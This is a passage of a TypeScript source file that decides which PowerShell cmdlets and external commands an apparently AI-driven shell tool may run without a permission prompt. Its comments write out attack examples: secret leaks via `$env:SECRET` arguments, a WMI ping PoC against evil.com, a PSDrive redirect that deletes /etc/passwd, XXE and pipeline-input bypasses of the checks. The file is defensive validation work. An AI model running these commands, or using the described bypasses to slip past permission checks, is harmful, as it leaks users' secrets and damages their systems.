/**
 * PowerShell 只读命令验证。
 *
 * Cmdlet 不区分大小写；所有匹配均使用小写。
 */

import type {
  ParsedCommandElement,
  ParsedPowerShellCommand,
} from '../../shell-eval/powershell/parser.js'

type ParsedStatement = ParsedPowerShellCommand['statements'][number]

import {
  COMMON_ALIASES,
  deriveSecurityFlags,
  getPipelineSegments,
  isNullRedirectionTarget,
  isPowerShellParameter,
} from '../../shell-eval/powershell/parser.js'
import type { ExternalCommandConfig } from '../../shell-eval/shared/readOnlyCommandValidation.js'
import {
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  validateFlags,
} from '../../shell-eval/shared/readOnlyCommandValidation.js'
import { isInternalBuild } from '../../services/infra/envUtils.js'
import { getPlatform } from '../../services/shell/platform.js'
import { COMMON_PARAMETERS } from './commonParameters.js'

const DOTNET_READ_ONLY_FLAGS = new Set(['--version', '--info', '--list-runtimes', '--list-sdks'])

type CommandConfig = {
  /** 此命令的安全子命令或 flag */
  safeFlags?: string[]
  /**
   * 为 true 时，无论 safeFlags 如何都允许全部 flag。
   * 用于所有 flag 都只读的命令（如 hostname）。若未设置此项，safeFlags 为空或缺失时
   * 会拒绝所有 flag，只允许位置参数。
   */
  allowAllFlags?: boolean
  /** 对原始命令施加的 regex 约束 */
  regex?: RegExp
  /** 额外验证回调；命令危险时返回 true */
  additionalCommandIsDangerousCallback?: (
    command: string,
    element?: ParsedCommandElement,
  ) => boolean
}

/**
 * 供把参数打印到 stdout/stderr 或强制转换参数的 cmdlet 共用的回调。
 * `Write-Output $env:SECRET` 会直接打印 secret；`Start-Sleep $env:SECRET`
 * 会通过类型转换错误泄漏。Bash 的 echo regex 会逐 token 将安全字符列入白名单。
 *
 * 执行两项检查：
 * 1. elementTypes allowlist：只允许 StringConstant（字面量）和 Parameter（flag 名）。
 *    拒绝 Variable、Other（HashtableAst/ConvertExpressionAst/BinaryExpressionAst
 *    均映射为 Other）、ScriptBlock、SubExpression、ExpandableString。
 *    模式与 SAFE_PATH_ELEMENT_TYPES 相同。
 * 2. 冒号绑定参数值：`-InputObject:$env:SECRET` 只会生成一个 CommandParameterAst；
 *    VariableExpressionAst 是它的 .Argument 子节点，而非独立 CommandElement。
 *    elementTypes = [..., 'Parameter'] 会通过 allowlist，因此需查询 children[] 中
 *    .Argument 的映射类型；除 StringConstant 外的任何类型（Variable、包装任意管道的
 *    ParenExpression、Hashtable 等）都是泄漏向量。
 */
export function argLeaksValue(_cmd: string, element?: ParsedCommandElement): boolean {
  const argTypes = (element?.elementTypes ?? []).slice(1)
  const args = element?.args ?? []
  const children = element?.children
  for (let i = 0; i < argTypes.length; i++) {
    if (argTypes[i] !== 'StringConstant' && argTypes[i] !== 'Parameter') {
      // ArrayLiteralAst（`Select-Object Name, Id`）映射为 'Other'；解析脚本只为
      // CommandParameterAst.Argument 填充 children，无法检查其元素。因此回退到
      // 对 extent 文本做字符串检查：Hashtable 含 `@{`，ParenExpr 含 `(`，变量含 `$`，
      // 类型字面量含 `[`，scriptblock 含 `{`；裸标识符逗号列表不含这些字符。
      // `Name, $x` 仍会因 `$` 被拒绝。
      if (!/[$(@{[]/.test(args[i] ?? '')) {
        continue
      }
      return true
    }
    if (argTypes[i] === 'Parameter') {
      const paramChildren = children?.[i]
      if (paramChildren) {
        if (paramChildren.some((c) => c.type !== 'StringConstant')) {
          return true
        }
      } else {
        // 回退：对参数文本做字符串检查，兼容尚无 children 的 parser。
        // 拒绝 `$`（变量）、`(`（ParenExpressionAst）、`@`（hash/array sub）、
        // `{`（scriptblock）、`[`（类型字面量或静态方法）。
        const arg = args[i] ?? ''
        const colonIdx = arg.indexOf(':')
        if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
          return true
        }
      }
    }
  }
  return false
}

/**
 * 视为只读的 PowerShell cmdlet allowlist。每个 cmdlet 映射到包含安全 flag 的配置。
 *
 * 注意：PowerShell cmdlet 不区分大小写，因此 key 以小写保存，输入也会规范化后匹配。
 *
 * 使用 Object.create(null) 防止原型链污染；攻击者可控的 'constructor' 或
 * '__proto__' 等命令名必须返回 undefined，不能取得继承自 Object.prototype 的属性。
 * 防护方式与 parser.ts 中 COMMON_ALIASES 相同。
 */
export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
  Object.create(null) as Record<string, CommandConfig>,
  {
    // =========================================================================
    // PowerShell Cmdlet——文件系统（只读）。
    // =========================================================================
    'get-childitem': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Filter',
        '-Include',
        '-Exclude',
        '-Recurse',
        '-Depth',
        '-Name',
        '-Force',
        '-Attributes',
        '-Directory',
        '-File',
        '-Hidden',
        '-ReadOnly',
        '-System',
      ],
    },
    'get-content': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-TotalCount',
        '-Head',
        '-Tail',
        '-Raw',
        '-Encoding',
        '-Delimiter',
        '-ReadCount',
      ],
    },
    'get-item': {
      safeFlags: ['-Path', '-LiteralPath', '-Force', '-Stream'],
    },
    'get-itemproperty': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'test-path': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-PathType',
        '-Filter',
        '-Include',
        '-Exclude',
        '-IsValid',
        '-NewerThan',
        '-OlderThan',
      ],
    },
    'resolve-path': {
      safeFlags: ['-Path', '-LiteralPath', '-Relative'],
    },
    'get-filehash': {
      safeFlags: ['-Path', '-LiteralPath', '-Algorithm', '-InputStream'],
    },
    'get-acl': {
      safeFlags: ['-Path', '-LiteralPath', '-Audit', '-Filter', '-Include', '-Exclude'],
    },

    // =========================================================================
    // PowerShell Cmdlet——目录导航（只改变工作目录）。
    // =========================================================================
    'set-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'push-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'pop-location': {
      safeFlags: ['-PassThru', '-StackName'],
    },

    // =========================================================================
    // PowerShell Cmdlet——文本搜索和过滤（只读）。
    // =========================================================================
    'select-string': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Pattern',
        '-InputObject',
        '-SimpleMatch',
        '-CaseSensitive',
        '-Quiet',
        '-List',
        '-NotMatch',
        '-AllMatches',
        '-Encoding',
        '-Context',
        '-Raw',
        '-NoEmphasis',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlet——数据转换（纯转换，无副作用）。
    // =========================================================================
    'convertto-json': {
      safeFlags: ['-InputObject', '-Depth', '-Compress', '-EnumsAsStrings', '-AsArray'],
    },
    'convertfrom-json': {
      safeFlags: ['-InputObject', '-Depth', '-AsHashtable', '-NoEnumerate'],
    },
    'convertto-csv': {
      safeFlags: ['-InputObject', '-Delimiter', '-NoTypeInformation', '-NoHeader', '-UseQuotes'],
    },
    'convertfrom-csv': {
      safeFlags: ['-InputObject', '-Delimiter', '-Header', '-UseCulture'],
    },
    'convertto-xml': {
      safeFlags: ['-InputObject', '-Depth', '-As', '-NoTypeInformation'],
    },
    'convertto-html': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Head',
        '-Title',
        '-Body',
        '-Pre',
        '-Post',
        '-As',
        '-Fragment',
      ],
    },
    'format-hex': {
      safeFlags: ['-Path', '-LiteralPath', '-InputObject', '-Encoding', '-Count', '-Offset'],
    },

    // =========================================================================
    // PowerShell Cmdlet——对象检查和处理（只读）。
    // =========================================================================
    'get-member': {
      safeFlags: ['-InputObject', '-MemberType', '-Name', '-Static', '-View', '-Force'],
    },
    'get-unique': {
      safeFlags: ['-InputObject', '-AsString', '-CaseInsensitive', '-OnType'],
    },
    'compare-object': {
      safeFlags: [
        '-ReferenceObject',
        '-DifferenceObject',
        '-Property',
        '-SyncWindow',
        '-CaseSensitive',
        '-Culture',
        '-ExcludeDifferent',
        '-IncludeEqual',
        '-PassThru',
      ],
    },
    // 安全要求：移除 select-xml。XML 外部实体（XXE）解析可通过 -Content 或 -Xml 中的
    // DOCTYPE SYSTEM/PUBLIC 引用触发网络请求。PowerShell 的 XmlDocument.LoadXml
    // 默认不会禁用实体解析，因此移除后强制 prompt。
    'join-string': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Separator',
        '-OutputPrefix',
        '-OutputSuffix',
        '-SingleQuote',
        '-DoubleQuote',
        '-FormatString',
      ],
    },
    // 安全要求：移除 Test-Json。-Schema（位置 1）接收可用 $ref 指向外部 URL 的
    // JSON Schema，Test-Json 会请求这些 URL。safeFlags 只验证显式 flag，不验证位置绑定；
    // 因此攻击 payload 会让位置 1 绑定到 -Schema，而 safeFlags 看到两个非 flag 参数后
    // 全部跳过并自动允许。
    'get-random': {
      safeFlags: ['-InputObject', '-Minimum', '-Maximum', '-Count', '-SetSeed', '-Shuffle'],
    },

    // =========================================================================
    // PowerShell Cmdlet——路径工具（只读）。
    // =========================================================================
    // convert-path 的用途就是解析文件系统路径。它现已加入 CMDLET_PATH_CONFIG，
    // 由该配置正确验证路径，因此此处 safeFlags 只列出路径参数；
    // CMDLET_PATH_CONFIG 会验证这些参数。
    'convert-path': {
      safeFlags: ['-Path', '-LiteralPath'],
    },
    'join-path': {
      // 移除 -Resolve：它会访问文件系统确认拼接路径存在，但此前没有对允许目录验证路径。
      // 不带 -Resolve 时，Join-Path 只是纯字符串处理。
      safeFlags: ['-Path', '-ChildPath', '-AdditionalChildPath'],
    },
    'split-path': {
      // 移除 -Resolve：理由与 join-path 相同。不带 -Resolve 时，Split-Path 只是纯字符串处理。
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Qualifier',
        '-NoQualifier',
        '-Parent',
        '-Leaf',
        '-LeafBase',
        '-Extension',
        '-IsAbsolute',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlet——其他系统信息（只读）。
    // =========================================================================
    // 注意：有意不包含 Get-Clipboard，因为它可能泄漏用户复制的密码或 API key 等敏感数据。
    // Bash 同样不会自动允许 clipboard 命令（pbpaste、xclip 等）。
    'get-hotfix': {
      safeFlags: ['-Id', '-Description'],
    },
    'get-itempropertyvalue': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'get-psprovider': {
      safeFlags: ['-PSProvider'],
    },

    // =========================================================================
    // PowerShell Cmdlet——进程和系统信息。
    // =========================================================================
    'get-process': {
      safeFlags: ['-Name', '-Id', '-Module', '-FileVersionInfo', '-IncludeUserName'],
    },
    'get-service': {
      safeFlags: [
        '-Name',
        '-DisplayName',
        '-DependentServices',
        '-RequiredServices',
        '-Include',
        '-Exclude',
      ],
    },
    'get-computerinfo': {
      allowAllFlags: true,
    },
    'get-host': {
      allowAllFlags: true,
    },
    'get-date': {
      safeFlags: ['-Date', '-Format', '-UFormat', '-DisplayHint', '-AsUTC'],
    },
    'get-location': {
      safeFlags: ['-PSProvider', '-PSDrive', '-Stack', '-StackName'],
    },
    'get-psdrive': {
      safeFlags: ['-Name', '-PSProvider', '-Scope'],
    },
    // 安全要求：从 allowlist 移除 Get-Command。-Name（位置 0，ValueFromPipeline=true）
    // 会触发 module 自动加载并运行 .psm1 初始化代码。链式攻击可预先在 PSModulePath
    // 放置 module，再触发自动加载。此前尝试从 safeFlags 移除 -Name/-Module 并拒绝
    // 位置 StringConstant，但管道输入时 args 为空，会完全绕过 callback。
    // 移除后强制 prompt；有需要的用户可添加显式 allow 规则。
    'get-module': {
      safeFlags: ['-Name', '-ListAvailable', '-All', '-FullyQualifiedName', '-PSEdition'],
    },
    // 安全要求：从 allowlist 移除 Get-Help。它与 Get-Command 存在相同的 module 自动加载
    // 风险：-Name 的 ValueFromPipeline=true，管道输入可绕过参数级 callback。
    // 移除后强制 prompt。
    'get-alias': {
      safeFlags: ['-Name', '-Definition', '-Scope', '-Exclude'],
    },
    'get-history': {
      safeFlags: ['-Id', '-Count'],
    },
    'get-culture': {
      allowAllFlags: true,
    },
    'get-uiculture': {
      allowAllFlags: true,
    },
    'get-timezone': {
      safeFlags: ['-Name', '-Id', '-ListAvailable'],
    },
    'get-uptime': {
      allowAllFlags: true,
    },

    // =========================================================================
    // PowerShell Cmdlet——输出及其他无副作用操作。
    // =========================================================================
    // 与 Bash 对齐：`echo` 通过自定义 regex 自动允许（BashTool
    // readOnlyValidation.ts:~1517），该 regex 会逐参数将安全字符列入白名单。
    // 它阻止的三种攻击形式参见上方 argLeaksValue。
    'write-output': {
      safeFlags: ['-InputObject', '-NoEnumerate'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Write-Host 会绕过管道（PS5+ 的 Information stream），能力严格弱于 Write-Output，
    // 但仍存在相同的 `Write-Host $env:SECRET` 显示泄漏。
    'write-host': {
      safeFlags: ['-Object', '-NoNewline', '-Separator', '-ForegroundColor', '-BackgroundColor'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // 与 Bash 对齐：`sleep` 位于 READONLY_COMMANDS（BashTool
    // readOnlyValidation.ts:~1146）。它运行时无副作用，但
    // `Start-Sleep $env:SECRET` 会通过类型转换错误泄漏，因此使用同一关卡。
    'start-sleep': {
      safeFlags: ['-Seconds', '-Milliseconds', '-Duration'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Format-* and Measure-Object moved here from SAFE_OUTPUT_CMDLETS after
    // security review found all accept calculated-property hashtables (same
    // exploit as Where-Object — I4 regression). isSafeOutputCommand is a
    // NAME-ONLY check that filtered them out of the approval loop BEFORE arg
    // validation. Here, argLeaksValue validates args:
    //   | Format-Table               → no args → safe → allow
    //   | Format-Table Name, CPU     → StringConstant positionals → safe → allow
    //   | Format-Table $env:SECRET   → Variable elementType → blocked → passthrough
    //   | Format-Table @{N='x';E={}} → Other (HashtableAst) → blocked → passthrough
    //   | Measure-Object -Property $env:SECRET → same → blocked
    // allowAllFlags: argLeaksValue validates arg elementTypes (Variable/Hashtable/
    // ScriptBlock → blocked). Format-* flags themselves (-AutoSize, -GroupBy,
    // -Wrap, etc.) are display-only. Without allowAllFlags, the empty-safeFlags
    // default rejects ALL flags — `Format-Table -AutoSize` would over-prompt.
    'format-table': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-list': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-wide': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-custom': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'measure-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Select-Object/Sort-Object/Group-Object/Where-Object: same calculated-
    // property hashtable surface as format-* (about_Calculated_Properties).
    // Removed from SAFE_OUTPUT_CMDLETS but previously missing here, causing
    // `Get-Process | Select-Object Name` to over-prompt. argLeaksValue handles
    // them identically: StringConstant property names pass (`Select-Object Name`),
    // HashtableAst/ScriptBlock/Variable args block (`Select-Object @{N='x';E={...}}`,
    // `Where-Object { ... }`). allowAllFlags: -First/-Last/-Skip/-Descending/
    // -Property/-EQ etc. are all selection/ordering flags — harmless on their own;
    // argLeaksValue catches the dangerous arg *values*.
    'select-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'sort-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'group-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'where-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Out-String/Out-Host moved here from SAFE_OUTPUT_CMDLETS — both accept
    // -InputObject which leaks the same way Write-Output does.
    // `Get-Process | Out-String -InputObject $env:SECRET` → secret prints.
    // allowAllFlags: -Width/-Stream/-Paging/-NoNewline are display flags;
    // argLeaksValue catches the dangerous -InputObject *value*.
    'out-string': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'out-host': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },

    // =========================================================================
    // PowerShell Cmdlet——网络信息（只读）。
    // =========================================================================
    'get-netadapter': {
      safeFlags: ['-Name', '-InterfaceDescription', '-InterfaceIndex', '-Physical'],
    },
    'get-netipaddress': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias', '-AddressFamily', '-Type'],
    },
    'get-netipconfiguration': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias', '-Detailed', '-All'],
    },
    'get-netroute': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias', '-AddressFamily', '-DestinationPrefix'],
    },
    'get-dnsclientcache': {
      // SECURITY: -CimSession/-ThrottleLimit excluded. -CimSession connects to
      // a remote host (network request). Previously empty config = all flags OK.
      safeFlags: ['-Entry', '-Name', '-Type', '-Status', '-Section', '-Data'],
    },
    'get-dnsclient': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias'],
    },

    // =========================================================================
    // PowerShell Cmdlet——事件日志（只读）。
    // =========================================================================
    'get-eventlog': {
      safeFlags: [
        '-LogName',
        '-Newest',
        '-After',
        '-Before',
        '-EntryType',
        '-Index',
        '-InstanceId',
        '-Message',
        '-Source',
        '-UserName',
        '-AsBaseObject',
        '-List',
      ],
    },
    'get-winevent': {
      // SECURITY: -FilterXml/-FilterHashtable removed. -FilterXml accepts XML
      // with DOCTYPE external entities (XXE → network request). -FilterHashtable
      // would be caught by the elementTypes 'Other' check since @{} is
      // HashtableAst, but removal is explicit. Same XXE hazard as Select-Xml
      // (removed above). -FilterXPath kept (string pattern only, no entity
      // resolution). -ComputerName/-Credential also implicitly excluded.
      safeFlags: [
        '-LogName',
        '-ListLog',
        '-ListProvider',
        '-ProviderName',
        '-Path',
        '-MaxEvents',
        '-FilterXPath',
        '-Force',
        '-Oldest',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlet——WMI/CIM。
    // =========================================================================
    // SECURITY: Get-WmiObject and Get-CimInstance REMOVED. They actively
    // trigger network requests via classes like Win32_PingStatus (sends ICMP
    // when enumerated) and can query remote computers via -ComputerName/
    // CimSession. -Class/-ClassName/-Filter/-Query accept arbitrary WMI
    // classes/WQL that we cannot statically validate.
    //   PoC: Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"'
    //   → sends ICMP to evil.com (DNS leak + potential NTLM auth leak).
    // WMI can also auto-load provider DLLs (init code). Removal forces prompt.
    // get-cimclass stays — only lists class metadata, no instance enumeration.
    'get-cimclass': {
      safeFlags: ['-ClassName', '-Namespace', '-MethodName', '-PropertyName', '-QualifierName'],
    },

    // =========================================================================
    // Git——使用共享外部命令验证并逐 flag 检查。
    // =========================================================================
    git: {},

    // =========================================================================
    // GitHub CLI（gh）——使用共享外部命令验证。
    // =========================================================================
    gh: {},

    // =========================================================================
    // Docker——使用共享外部命令验证。
    // =========================================================================
    docker: {},

    // =========================================================================
    // Windows 专用系统命令。
    // =========================================================================
    ipconfig: {
      // SECURITY: On macOS, `ipconfig set <iface> <mode>` configures network
      // (writes system config). safeFlags only validates FLAGS, positional args
      // are SKIPPED. Reject any positional argument — only bare `ipconfig` or
      // `ipconfig /all` (read-only display) allowed. Windows ipconfig only uses
      // /flags (display), macOS ipconfig uses subcommands (get/set/waitall).
      safeFlags: ['/all', '/displaydns', '/allcompartments'],
      additionalCommandIsDangerousCallback: (_cmd: string, element?: ParsedCommandElement) => {
        return (element?.args ?? []).some((a) => !a.startsWith('/') && !a.startsWith('-'))
      },
    },
    netstat: {
      safeFlags: ['-a', '-b', '-e', '-f', '-n', '-o', '-p', '-q', '-r', '-s', '-t', '-x', '-y'],
    },
    systeminfo: {
      safeFlags: ['/FO', '/NH'],
    },
    tasklist: {
      safeFlags: ['/M', '/SVC', '/V', '/FI', '/FO', '/NH'],
    },
    // where.exe: Windows PATH locator, bash `which` equivalent. Reaches here via
    // SAFE_EXTERNAL_EXES bypass at the nameType gate in isAllowlistedCommand.
    // All flags are read-only (/R /F /T /Q), matching bash's treatment of `which`
    // in BashTool READONLY_COMMANDS.
    'where.exe': {
      allowAllFlags: true,
    },
    hostname: {
      // SECURITY: `hostname NAME` on Linux/macOS SETS the hostname (writes to
      // system config). `hostname -F FILE` / `--file=FILE` also sets from file.
      // Only allow bare `hostname` and known read-only flags.
      safeFlags: ['-a', '-d', '-f', '-i', '-I', '-s', '-y', '-A'],
      additionalCommandIsDangerousCallback: (_cmd: string, element?: ParsedCommandElement) => {
        // Reject any positional (non-flag) argument — sets hostname.
        return (element?.args ?? []).some((a) => !a.startsWith('-'))
      },
    },
    whoami: {
      safeFlags: ['/user', '/groups', '/claims', '/priv', '/logonid', '/all', '/fo', '/nh'],
    },
    ver: {
      allowAllFlags: true,
    },
    arp: {
      safeFlags: ['-a', '-g', '-v', '-N'],
    },
    route: {
      safeFlags: ['print', 'PRINT', '-4', '-6'],
      additionalCommandIsDangerousCallback: (_cmd: string, element?: ParsedCommandElement) => {
        // SECURITY: route.exe syntax is `route [-f] [-p] [-4|-6] VERB [args...]`.
        // The first non-flag positional is the verb. `route add 10.0.0.0 mask
        // 255.0.0.0 192.168.1.1 print` adds a route (print is a trailing display
        // modifier). The old check used args.some('print') which matched 'print'
        // anywhere — position-insensitive.
        if (!element) {
          return true
        }
        const verb = element.args.find((a) => !a.startsWith('-'))
        return verb?.toLowerCase() !== 'print'
      },
    },
    // netsh: intentionally NOT allowlisted. Three rounds of denylist gaps in PR
    // #22060 (verb position → dash flags → slash flags → more verbs) proved
    // the grammar is too complex to allowlist safely: 3-deep context nesting
    // (`netsh interface ipv4 show addresses`), dual-prefix flags (-f / /f),
    // script execution via -f and `exec`, remote RPC via -r, offline-mode
    // commit, wlan connect/disconnect, etc. Each denylist expansion revealed
    // another gap. `route` stays — `route print` is the only read-only form,
    // simple single-verb-position grammar.
    getmac: {
      safeFlags: ['/FO', '/NH', '/V'],
    },

    // =========================================================================
    // 跨平台 CLI 工具。
    // =========================================================================
    // 文件检查。
    // SECURITY: file -C compiles a magic database and WRITES to disk. Only
    // allow introspection flags; reject -C / --compile / -m / --magic-file.
    file: {
      safeFlags: [
        '-b',
        '--brief',
        '-i',
        '--mime',
        '-L',
        '--dereference',
        '--mime-type',
        '--mime-encoding',
        '-z',
        '--uncompress',
        '-p',
        '--preserve-date',
        '-k',
        '--keep-going',
        '-r',
        '--raw',
        '-v',
        '--version',
        '-0',
        '--print0',
        '-s',
        '--special-files',
        '-l',
        '-F',
        '--separator',
        '-e',
        '-P',
        '-N',
        '--no-pad',
        '-E',
        '--extension',
      ],
    },
    tree: {
      safeFlags: ['/F', '/A', '/Q', '/L'],
    },
    findstr: {
      safeFlags: [
        '/B',
        '/E',
        '/L',
        '/R',
        '/S',
        '/I',
        '/X',
        '/V',
        '/N',
        '/M',
        '/O',
        '/P',
        // Flag matching strips ':' before comparison (e.g., /C:pattern → /C),
        // so these entries must NOT include the trailing colon.
        '/C',
        '/G',
        '/D',
        '/A',
      ],
    },

    // =========================================================================
    // 包管理器——使用共享外部命令验证。
    // =========================================================================
    dotnet: {},

    // SECURITY: man and help direct entries REMOVED. They aliased Get-Help
    // (also removed — see above). Without these entries, lookupAllowlist
    // resolves via COMMON_ALIASES to 'get-help' which is not in allowlist →
    // prompt. Same module-autoload hazard as Get-Help.
  },
)

/**
 * Safe output/formatting cmdlets that can receive piped input.
 * Stored as canonical cmdlet names in lowercase.
 */
const SAFE_OUTPUT_CMDLETS = new Set([
  'out-null',
  // NOT out-string/out-host — both accept -InputObject which leaks args the
  // same way Write-Output does. Moved to CMDLET_ALLOWLIST with argLeaksValue.
  // `Get-Process | Out-String -InputObject $env:SECRET` — Out-String was
  // filtered name-only, the $env arg was never validated.
  // out-null stays: it discards everything, no -InputObject leak.
  // NOT foreach-object / where-object / select-object / sort-object /
  // group-object / format-table / format-list / format-wide / format-custom /
  // measure-object — ALL accept calculated-property hashtables or script-block
  // predicates that evaluate arbitrary expressions at runtime
  // (about_Calculated_Properties). Examples:
  //   Where-Object @{k=$env:SECRET}       — HashtableAst arg, 'Other' elementType
  //   Select-Object @{N='x';E={...}}      — calculated property scriptblock
  //   Format-Table $env:SECRET            — positional -Property, prints as header
  //   Measure-Object -Property $env:SECRET — leaks via "property 'sk-...' not found"
  //   ForEach-Object { $env:PATH='e' }    — arbitrary script body
  // isSafeOutputCommand is a NAME-ONLY check — step-5 filters these out of
  // the approval loop BEFORE arg validation runs. With them here, an
  // all-safe-output tail auto-allows on empty subCommands regardless of
  // what the arg contains. Removing them forces the tail through arg-level
  // validation (hashtable is 'Other' elementType → fails the whitelist at
  // isAllowlistedCommand → ask; bare $var is 'Variable' → same).
  //
  // NOT write-output — pipeline-initial $env:VAR is a VariableExpressionAst,
  // skipped by getSubCommandsForPermissionCheck (non-CommandAst). With
  // write-output here, `$env:SECRET | Write-Output` → WO filtered as
  // safe-output → empty subCommands → auto-allow → secret prints. The
  // CMDLET_ALLOWLIST entry handles direct `Write-Output 'literal'`.
])

/**
 * Cmdlets moved from SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST with
 * argLeaksValue. These are pipeline-tail transformers (Format-*,
 * Measure-Object, Select-Object, etc.) that were previously name-only
 * filtered as safe-output. They now require arg validation (argLeaksValue
 * blocks calculated-property hashtables / scriptblocks / variable args).
 *
 * Used by isAllowlistedPipelineTail for the narrow fallback in
 * checkPermissionMode and isReadOnlyCommand — these callers need the same
 * "skip harmless pipeline tail" behavior as SAFE_OUTPUT_CMDLETS but with
 * the argLeaksValue guard.
 */
const PIPELINE_TAIL_CMDLETS = new Set([
  'format-table',
  'format-list',
  'format-wide',
  'format-custom',
  'measure-object',
  'select-object',
  'sort-object',
  'group-object',
  'where-object',
  'out-string',
  'out-host',
])

/**
 * External .exe names allowed past the nameType='application' gate.
 *
 * classifyCommandName returns 'application' for any name containing a dot,
 * which the nameType gate at isAllowlistedCommand rejects before allowlist
 * lookup. That gate exists to block scripts\Get-Process → stripModulePrefix →
 * cmd.name='Get-Process' spoofing. But it also catches benign PATH-resolved
 * .exe names like where.exe (bash `which` equivalent — pure read, no dangerous
 * flags).
 *
 * SECURITY: the bypass checks the raw first token of cmd.text, NOT cmd.name.
 * stripModulePrefix collapses scripts\where.exe → cmd.name='where.exe', but
 * cmd.text preserves the raw 'scripts\where.exe ...'. Matching cmd.text's
 * first token defeats that spoofing — only a bare `where.exe` (PATH lookup)
 * gets through.
 *
 * Each entry here MUST have a matching CMDLET_ALLOWLIST entry for flag
 * validation.
 */
const SAFE_EXTERNAL_EXES = new Set(['where.exe'])

/**
 * Windows PATHEXT extensions that PowerShell resolves via PATH lookup.
 * `git.exe`, `git.cmd`, `git.bat`, `git.com` all invoke git at runtime and
 * must resolve to the same canonical name so git-safety guards fire.
 * .ps1 is intentionally excluded — a script named git.ps1 is not the git
 * binary and does not trigger git's hook mechanism.
 */
const WINDOWS_PATHEXT = /\.(exe|cmd|bat|com)$/

/**
 * Resolves a command name to its canonical cmdlet name using COMMON_ALIASES.
 * Strips Windows executable extensions (.exe, .cmd, .bat, .com) from path-free
 * names so e.g. `git.exe` canonicalises to `git` and triggers git-safety
 * guards (powershellPermissions.ts hasGitSubCommand). SECURITY: only strips
 * when the name has no path separator — `scripts\git.exe` is a relative path
 * (runs a local script, not PATH-resolved git) and must NOT canonicalise to
 * `git`. Returns lowercase canonical name.
 */
export function resolveToCanonical(name: string): string {
  let lower = name.toLowerCase()
  // Only strip PATHEXT on bare names — paths run a specific file, not the
  // PATH-resolved executable the guards are protecting against.
  if (!lower.includes('\\') && !lower.includes('/')) {
    lower = lower.replace(WINDOWS_PATHEXT, '')
  }
  const alias = COMMON_ALIASES[lower]
  if (alias) {
    return alias.toLowerCase()
  }
  return lower
}

/**
 * Checks if a command name (after alias resolution) alters the path-resolution
 * namespace for subsequent statements in the same compound command.
 *
 * Covers TWO classes:
 * 1. Cwd-changing cmdlets: Set-Location, Push-Location, Pop-Location (and
 *    aliases cd, sl, chdir, pushd, popd). Subsequent relative paths resolve
 *    from the new cwd.
 * 2. PSDrive-creating cmdlets: New-PSDrive (and aliases ndr, mount on Windows).
 *    Subsequent drive-prefixed paths (p:/foo) resolve via the new drive root,
 *    not via the filesystem. Finding #21: `New-PSDrive -Name p -Root /etc;
 *    Remove-Item p:/passwd` — the validator cannot know p: maps to /etc.
 *
 * Any compound containing one of these cannot have its later statements'
 * relative/drive-prefixed paths validated against the stale validator cwd.
 *
 * Name kept for BashTool parity (isCwdChangingCmdlet ↔ compoundCommandHasCd);
 * semantically this is "alters path-resolution namespace".
 */
export function isCwdChangingCmdlet(name: string): boolean {
  const canonical = resolveToCanonical(name)
  return (
    canonical === 'set-location' ||
    canonical === 'push-location' ||
    canonical === 'pop-location' ||
    // New-PSDrive creates a drive mapping that redirects <name>:/... paths
    // to an arbitrary filesystem root. Aliases ndr/mount are not in
    // COMMON_ALIASES — check them explicitly (finding #21).
    canonical === 'new-psdrive' ||
    // ndr/mount are PS aliases for New-PSDrive on Windows only. On POSIX,
    // 'mount' is the native mount(8) command; treating it as PSDrive-creating
    // would false-positive. (bug #15 / review nit)
    (getPlatform() === 'windows' && (canonical === 'ndr' || canonical === 'mount'))
  )
}

/**
 * Checks if a command name (after alias resolution) is a safe output cmdlet.
 */
export function isSafeOutputCommand(name: string): boolean {
  const canonical = resolveToCanonical(name)
  return SAFE_OUTPUT_CMDLETS.has(canonical)
}

/**
 * Checks if a command element is a pipeline-tail transformer that was moved
 * from SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST (PIPELINE_TAIL_CMDLETS set)
 * AND passes its argLeaksValue guard via isAllowlistedCommand.
 *
